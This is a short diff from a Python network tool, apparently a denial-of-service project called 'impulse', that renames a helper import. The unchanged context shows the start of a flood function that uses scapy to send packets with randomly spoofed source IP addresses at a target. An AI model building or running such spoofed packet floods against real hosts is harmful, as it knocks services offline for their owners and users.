@@ -4,12 +4,12 @@ import random
 from colorama import Fore
 from scapy.all import IP, TCP, send
 
-from impulse import randomData
+from impulse import random_data
 
 
 def flood(target):
     IP_Packet = IP()
-    IP_Packet.src = randomData.random_IP()
+    IP_Packet.src = random_data.random_IP()
     IP_Packet.dst = target[0]
 
     TCP_Packet = TCP()
